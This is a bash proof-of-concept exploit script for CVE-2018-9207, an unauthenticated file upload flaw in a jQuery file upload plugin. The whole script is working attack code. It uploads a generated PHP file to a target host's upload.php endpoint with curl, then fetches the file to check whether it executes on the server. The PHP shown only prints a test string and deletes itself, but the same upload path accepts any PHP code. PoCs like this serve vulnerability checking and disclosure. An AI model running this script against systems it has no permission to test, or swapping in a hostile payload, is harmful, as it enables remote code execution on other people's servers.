#!/bin/bash 

USERAGENT="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
MALICIOUS_FILE="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1).php"

function exit(){
    rm -f "${MALICIOUS_FILE}" &>/dev/null
    command exit $1
}

# Checking curl & jq

curl -h &>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Please install curl."
    echo "# apt install curl"
    exit 1
fi

# Checking url

if [ -z $1 ]; then
    echo "[!] Please supply a target host as an argument."
    echo "$0 http://www.example.com"
    exit 1
fi

# Generating payload

echo "<?php echo \"it works\"; unlink(__FILE__); ?>" > ${MALICIOUS_FILE}
echo  "__________________________________________________________________________________"
echo  "|PoC Exploit for jQuery file upload  CVE-2018-9207          |"
echo  "|Checks for older versions of the code and upload an harmless file.               |"
echo  "|                                                                                 |"
echo  "|@_larry0                                                                         |"
echo  "|Works for version <= v1.1beta                                                    |"
echo  "|_________________________________________________________________________________|"
echo

# Creating alias

curl="curl --connect-timeout 10 -sk -A \"${USERAGENT}\""

# Uploading payload

res=""
echo "${curl} -F "myfile=@${MALICIOUS_FILE}" http://$1/jquery-upload-file/php/upload.php"

filename=`${curl} -F "myfile=@${MALICIOUS_FILE}" http://$1/jquery-upload-file/php/upload.php`

if [ "X""${filename}" == "X" ]; then
    echo "[+] Looking Good!"
fi

# Trying to see if victim has been exploited

echo "[+] Testing path: $1/jquery-upload-file/php/uploads/${MALICIOUS_FILE}"
res=`${curl} "$1/jquery-upload-file/php/uploads/${MALICIOUS_FILE}"`

if [ "${res}" == "it works" ]; then
    echo "[!] Found: $1 is vulnerable"
else
    echo "[+] Seems not vulnerable "
fi

exit 0
